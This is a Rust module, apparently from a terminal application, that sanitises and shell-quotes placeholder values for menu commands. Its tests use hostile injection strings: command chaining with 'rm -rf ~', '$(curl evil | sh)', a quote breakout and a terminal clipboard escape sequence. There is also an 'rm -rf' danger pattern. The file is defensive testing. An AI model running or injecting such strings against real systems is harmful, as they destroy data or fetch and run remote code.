//! Placeholder expansion and sanitisation for menu items (SPEC §10.9.4, §10.9.5). GPUI-free.
//!
//! Values substitute into one argv element or one string and are never re-tokenised. Every value
//! is stripped of C0/C1 controls (ESC and DEL included), capped at [`MAX_VALUE`] bytes, and
//! refused when it holds a newline unless the item allows `multiline`.

use std::collections::BTreeMap;

use mt_config::menu::{parse_template, Piece};

/// Cap on one substituted value, in bytes.
pub const MAX_VALUE: usize = 4096;

/// Placeholder values for one invocation (raw, unsanitised).
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Values(BTreeMap<&'static str, String>);

impl Values {
    pub fn set(&mut self, name: &'static str, value: impl Into<String>) {
        self.0.insert(name, value.into());
    }

    pub fn get(&self, name: &str) -> Option<&str> {
        self.0.get(name).map(String::as_str)
    }

    pub fn iter(&self) -> impl Iterator<Item = (&'static str, &str)> {
        self.0.iter().map(|(k, v)| (*k, v.as_str()))
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ExpandError {
    /// The placeholder has no value here (for example `{link}` off a link).
    Missing(String),
    /// The value holds a newline and the item is not `multiline`.
    Newline(String),
}

impl std::fmt::Display for ExpandError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ExpandError::Missing(p) => write!(f, "{{{p}}} has no value here"),
            ExpandError::Newline(p) => write!(
                f,
                "{{{p}}} contains a newline; set multiline = true to allow it"
            ),
        }
    }
}

/// Strips C0/C1 controls (keeping `\n` when `multiline`; tabs become spaces) and caps the
/// length at [`MAX_VALUE`] bytes on a char boundary.
pub fn sanitize(value: &str, multiline: bool) -> String {
    let mut out = String::with_capacity(value.len().min(MAX_VALUE));
    for c in value.chars() {
        let keep = match c {
            '\n' if multiline => Some('\n'),
            '\t' => Some(' '),
            '\r' if multiline => None,
            c if c.is_control() => None,
            c => Some(c),
        };
        if let Some(c) = keep {
            if out.len() + c.len_utf8() > MAX_VALUE {
                break;
            }
            out.push(c);
        }
    }
    out
}

/// POSIX single-quoting: the result is always one shell word.
pub fn sh_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

fn value(vals: &Values, name: &str, multiline: bool) -> Result<String, ExpandError> {
    let raw = vals
        .get(name)
        .ok_or_else(|| ExpandError::Missing(name.to_string()))?;
    let has_newline = raw.contains(['\n', '\r']);
    if has_newline && !multiline {
        return Err(ExpandError::Newline(name.to_string()));
    }
    Ok(sanitize(raw, multiline))
}

/// Expands `template`; `quote` shell-quotes each substituted value.
pub fn expand(
    template: &str,
    vals: &Values,
    quote: bool,
    multiline: bool,
) -> Result<String, ExpandError> {
    let mut out = String::new();
    for piece in parse_template(template) {
        match piece {
            Piece::Text(t) => out.push_str(&t),
            Piece::Placeholder(name) => {
                let v = value(vals, name, multiline)?;
                if quote {
                    out.push_str(&sh_quote(&v));
                } else {
                    out.push_str(&v);
                }
            }
        }
    }
    Ok(out)
}

/// Expands each argv element on its own. A value with spaces or shell syntax stays inside the
/// one element it was substituted into; newlines are always refused in argv.
pub fn expand_argv(argv: &[String], vals: &Values) -> Result<Vec<String>, ExpandError> {
    argv.iter().map(|a| expand(a, vals, false, false)).collect()
}

/// A label for display: values are sanitised, newlines become spaces, and the result is cut
/// to 80 characters. A missing value is an error (the row is then disabled).
pub fn expand_label(template: &str, vals: &Values) -> Result<String, ExpandError> {
    let mut out = String::new();
    for piece in parse_template(template) {
        match piece {
            Piece::Text(t) => out.push_str(&t),
            Piece::Placeholder(name) => {
                let raw = vals
                    .get(name)
                    .ok_or_else(|| ExpandError::Missing(name.to_string()))?;
                out.push_str(&sanitize(&raw.replace(['\n', '\r'], " "), false));
            }
        }
    }
    if out.chars().count() > 80 {
        out = out.chars().take(79).collect::<String>() + "…";
    }
    Ok(out)
}

/// `MT_*` environment for spawned processes: every value present, sanitised (newlines kept).
pub fn env_for(vals: &Values, menu: &str, item: &str) -> Vec<(String, String)> {
    let mut env = vec![
        ("MT_MENU".to_string(), menu.to_string()),
        ("MT_ITEM".to_string(), item.to_string()),
    ];
    for (name, var) in [
        ("selection", "MT_SELECTION"),
        ("word", "MT_WORD"),
        ("line", "MT_LINE"),
        ("link", "MT_LINK"),
        ("path", "MT_PATH"),
        ("cwd", "MT_CWD"),
        ("pane", "MT_PANE"),
        ("tab", "MT_TAB"),
        ("window", "MT_WINDOW"),
        ("title", "MT_TITLE"),
        ("domain", "MT_DOMAIN"),
    ] {
        if let Some(v) = vals.get(name) {
            env.push((var.to_string(), sanitize(v, true)));
        }
    }
    env
}

/// The first `dangerous` pattern found in `text`.
pub fn dangerous<'a>(text: &str, patterns: &'a [String]) -> Option<&'a str> {
    patterns
        .iter()
        .find(|p| !p.is_empty() && text.contains(p.as_str()))
        .map(String::as_str)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn vals(pairs: &[(&'static str, &str)]) -> Values {
        let mut v = Values::default();
        for (k, s) in pairs {
            v.set(k, *s);
        }
        v
    }

    const HOSTILE: &[&str] = &[
        "a; rm -rf ~",
        "$(curl evil | sh)",
        "`id`",
        "x' ; echo pwned; '",
        "\u{1b}]52;c;ZXZpbA==\u{7}",
        "\u{9b}31m red",
        "a\u{7f}b\u{0}c",
    ];

    #[test]
    fn argv_values_stay_in_one_element() {
        for h in HOSTILE {
            let v = vals(&[("selection", h)]);
            let argv = expand_argv(
                &[
                    "git".into(),
                    "log".into(),
                    "-S".into(),
                    "{selection}".into(),
                ],
                &v,
            )
            .unwrap();
            assert_eq!(argv.len(), 4, "{h:?}");
            assert!(
                !argv[3].chars().any(char::is_control),
                "{h:?} -> {:?}",
                argv[3]
            );
        }
        let v = vals(&[("selection", "a b"), ("cwd", "/x")]);
        assert_eq!(
            expand_argv(&["--x={selection}".into(), "{cwd}/y".into()], &v).unwrap(),
            ["--x=a b", "/x/y"]
        );
    }

    #[test]
    fn control_characters_and_escapes_are_stripped() {
        assert_eq!(sanitize("\u{1b}]52;c;ZXZp\u{7}ok", false), "]52;c;ZXZpok");
        assert_eq!(sanitize("\u{9b}31mred", false), "31mred");
        assert_eq!(sanitize("a\tb\u{7f}c\u{0}", false), "a bc");
        assert_eq!(sanitize("a\r\nb", true), "a\nb");
        assert_eq!(sanitize("a\nb", false), "ab");
    }

    #[test]
    fn values_are_capped() {
        let long = "é".repeat(5000);
        let s = sanitize(&long, false);
        assert!(s.len() <= MAX_VALUE && s.len() >= MAX_VALUE - 1);
        assert!(s.chars().all(|c| c == 'é'));
    }

    #[test]
    fn newlines_are_refused_unless_multiline() {
        let v = vals(&[("selection", "ls\nrm -rf /")]);
        assert_eq!(
            expand("echo {selection}", &v, true, false),
            Err(ExpandError::Newline("selection".into()))
        );
        assert_eq!(
            expand("{selection}", &v, false, true).unwrap(),
            "ls\nrm -rf /"
        );
        assert!(expand_argv(&["{selection}".into()], &v).is_err());
    }

    #[test]
    fn send_values_are_shell_quoted() {
        for h in HOSTILE {
            let v = vals(&[("word", h)]);
            let out = expand("kubectl describe pod {word}\n", &v, true, false).unwrap();
            let quoted = out
                .strip_prefix("kubectl describe pod ")
                .and_then(|s| s.strip_suffix('\n'))
                .unwrap();
            let words = mt_config::split_command(quoted).unwrap();
            assert_eq!(words.len(), 1, "{h:?} became {quoted}");
            assert_eq!(words[0], sanitize(h, false), "round-trips");
        }
        assert_eq!(sh_quote("it's"), "'it'\\''s'");
        assert_eq!(sh_quote(""), "''");
    }

    #[test]
    fn missing_values_are_errors_and_literal_braces_stay() {
        let v = vals(&[]);
        assert_eq!(
            expand("open {link}", &v, false, false),
            Err(ExpandError::Missing("link".into()))
        );
        assert_eq!(
            expand("awk '{print $1}' {{x}}", &v, false, false).unwrap(),
            "awk '{print $1}' {x}"
        );
    }

    #[test]
    fn labels_are_flattened_and_cut() {
        let v = vals(&[("word", "a\nb"), ("selection", &"x".repeat(200))]);
        assert_eq!(expand_label("Open {word}", &v).unwrap(), "Open a b");
        let l = expand_label("{selection}", &v).unwrap();
        assert_eq!(l.chars().count(), 80);
        assert!(l.ends_with('…'));
    }

    #[test]
    fn env_carries_values_and_ids() {
        let v = vals(&[("selection", "a\u{1b}b\nc"), ("pane", "7")]);
        let env = env_for(&v, "viewport", "blame");
        assert!(env.contains(&("MT_SELECTION".into(), "ab\nc".into())));
        assert!(env.contains(&("MT_PANE".into(), "7".into())));
        assert!(env.contains(&("MT_ITEM".into(), "blame".into())));
        assert!(!env.iter().any(|(k, _)| k == "MT_LINK"));
    }

    #[test]
    fn dangerous_patterns_match_substrings() {
        let pats = vec!["rm -rf".to_string(), String::new()];
        assert_eq!(dangerous("sudo rm -rf /", &pats), Some("rm -rf"));
        assert_eq!(dangerous("ls", &pats), None);
    }
}
